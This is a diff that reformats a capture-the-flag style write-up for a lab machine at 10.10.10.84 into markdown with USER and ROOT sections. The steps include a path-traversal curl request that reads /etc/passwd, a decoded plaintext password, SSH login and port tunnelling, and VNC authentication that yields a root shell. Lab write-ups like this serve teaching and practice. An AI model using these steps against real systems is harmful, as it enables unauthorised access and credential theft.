@@ -1,42 +1,62 @@
+![logo](./logo.png)
+
 10.10.10.84
 
-# Website hosted on the :80 port allows for shell script testing
+# USER
 
-# listfiles.php gives a directory listing.
-# A file called pwdbackup.txt
+Website hosted on the :80 port allows for shell script testing
 
-# It's base64 encoded 13 times. Decoding gives us:
+listfiles.php gives a directory listing.
+A file called pwdbackup.txt is shown
 
->>> Charix!2#4%6&8(0
+It's base64 encoded 13 times. Decoding gives us:
 
-# By traversing to the passwd file we can get the username
+```
+Charix!2#4%6&8(0
+```
 
->>> curl 'http://10.10.10.84/browse.php?file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd'
+By traversing to the passwd file we can get the username
 
-# Therefore we can log into ssh using:
+```
+curl 'http://10.10.10.84/browse.php?file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd'
+```
 
->>> charix
->>> ssh charix@10.10.10.84
+Therefore we can log into ssh using:
 
-# This allows us to get the user.txt
+```
+charix
+ssh charix@10.10.10.84
+```
 
-# In the directory is a secret.zip
+This allows us to get the user.txt
 
-# The .zip file is password protected. Will run it through a rockyou script
-# No need for the brute force. The password is re-used from the user account
+# ROOT
 
-# You can see listening services
+In the directory is a secret.zip
 
->>> netstat -an 
+The .zip file is password protected. Will run it through a rockyou script
+No need for the brute force. The password is re-used from the user account
 
-# You can create tunneled ssh using -L local_port:address:remote_port
+You can see listening services
 
->>> ssh -L 5801:127.0.0.1:5801 -L 5901:127.0.0.1:5901 charix@10.10.10.84
+```
+netstat -an 
+```
+
+You can create tunneled ssh using -L local_port:address:remote_port
+
+```
+ssh -L 5801:127.0.0.1:5801 -L 5901:127.0.0.1:5901 charix@10.10.10.84
+```
 
 # This allows us to connect to the port on our base machine. Running:
 
->>> curl 127.0.0.1:5901
+```
+curl 127.0.0.1:5901
+```
 
 # Then by using the secret we found ealier we can authenticate with the VNC server and gain a shell
 
->>> vncviewer 127.0.0.1::5901 -passwd secret.txt
+```
+vncviewer 127.0.0.1::5901 -passwd secret
+```
